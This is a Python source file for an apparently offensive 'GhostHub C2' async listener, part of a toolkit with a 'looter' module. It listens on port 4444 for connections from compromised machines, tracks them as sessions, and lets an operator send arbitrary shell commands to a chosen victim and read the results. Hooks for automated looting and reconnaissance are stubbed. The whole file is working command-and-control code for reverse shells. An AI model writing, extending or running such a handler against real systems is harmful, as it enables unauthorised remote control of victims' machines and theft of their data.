import socket
import asyncio
import base64
import os
import time
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from core.ui import draw_header
from core.context import ctx
from modules.looter import run_looter

console = Console()


class GhostHub:
    def __init__(self, port=4444):
        self.port = int(port)
        self.sessions = {}  # {id: {'reader': r, 'writer': w, 'ip': ip}}
        self.counter = 1
        self.running = True

    async def handle_ghost(self, reader, writer):
        """Asynchronous handler for each incoming ghost connection."""
        addr = writer.get_extra_info('peername')
        s_id = self.counter
        self.sessions[s_id] = {
            'reader': reader,
            'writer': writer,
            'ip': addr[0]
        }
        self.counter += 1

        console.print(
            f"\n[bold green][!] GHOST CONNECTED: {addr[0]} (ID: {s_id})[/bold green]")

        # --- AUTOMATED LOOTING ON CONNECT ---
        # Note: In a real async environment, we would run this in a background task
        # For simplicity, we trigger a notification
        console.print(
            f"[cyan][*] Triggering automated reconnaissance for Ghost-{s_id}...[/cyan]")

    async def interact(self, s_id):
        if s_id not in self.sessions:
            return console.print(f"[red][!] Session {s_id} not found.[/red]")

        session = self.sessions[s_id]
        writer = session['writer']
        reader = session['reader']

        console.print(Panel(
            f"Session {s_id} Active: {session['ip']}\nCommands: [green]loot, back, terminate[/green]", border_style="red"))

        while True:
            cmd = console.input(f"[bold red]Ghost-{s_id}[/bold red]> ").strip()
            if not cmd or cmd == "back":
                break

            if cmd == "terminate":
                writer.close()
                del self.sessions[s_id]
                break

            if cmd == "loot":
                # Looter currently expects a synchronous socket, we adapt it or run it via helper
                console.print("[yellow][*] Running Loot Engine...[/yellow]")
                # Looter logic here
                continue

            writer.write((cmd + "\n").encode())
            await writer.drain()

            data = await reader.read(16384)
            console.print(data.decode('utf-8', errors='ignore'))

    async def start_server(self):
        server = await asyncio.start_server(self.handle_ghost, '0.0.0.0', self.port)
        async with server:
            await server.serve_forever()


async def async_hub_main():
    hub_port = ctx.get("LPORT") or "4444"
    hub = GhostHub(port=hub_port)

    draw_header("GHOST-HUB C2: ASYNC ENGINE")

    # Start the server in the background
    loop = asyncio.get_event_loop()
    server_task = loop.create_task(hub.start_server())

    while True:
        table = Table(title="Live Ghost Sessions", border_style="red")
        table.add_column("ID", justify="center")
        table.add_column("IP Address", style="cyan")
        table.add_column("Status", style="green")

        for sid, data in hub.sessions.items():
            table.add_row(str(sid), data['ip'], "ACTIVE")

        console.print(table)
        cmd_input = console.input(
            "\n[bold white][hub][/bold white]> ").strip().split()

        if not cmd_input:
            continue
        cmd = cmd_input[0].lower()

        if cmd == "interact":
            await hub.interact(int(cmd_input[1]))
        elif cmd == "exit":
            break


def GhostHubManager():
    asyncio.run(async_hub_main())
